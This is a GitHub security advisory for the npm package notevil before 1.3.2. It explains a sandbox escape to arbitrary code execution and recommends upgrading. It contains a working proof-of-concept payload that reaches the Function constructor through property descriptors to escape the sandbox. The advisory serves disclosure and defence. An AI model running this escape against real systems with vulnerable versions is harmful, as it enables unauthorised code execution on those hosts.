# [H] Sandbox Breakout / Arbitrary Code Execution in notevil

## Summary
Severity: High
Advisory: GHSA-7r5f-7qr4-pf6q
Ecosystem: npm
Published: 2020-09-03
Source: https://github.com/advisories/GHSA-7r5f-7qr4-pf6q
Type: github-advisory

## Affected
- npm: `notevil` — affected >=0 <1.3.2

## Details
Versions of `notevil` prior to 1.3.2 are vulnerable to Sandbox Escape leading to Remote Code Execution. The package fails to prevent access to the `Function` constructor by not checking the return values of function calls. This allows attackers to access the Function prototype's constructor leading to the Sandbox Escape. An example payload is:  
```
var safeEval = require('notevil')
var input = "" + 
"function fn() {};" + 
"var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;" + 
"var properties = Object.values(constructorProperty);" + 
"properties.pop();" + 
"properties.pop();" + 
"properties.pop();" + 
"var Function = properties.pop();" + 
"(Function('return this'))()"; 
safeEval(input)```


## Recommendation

Upgrade to version 1.3.2 or later.

## References
- https://www.npmjs.com/advisories/1093
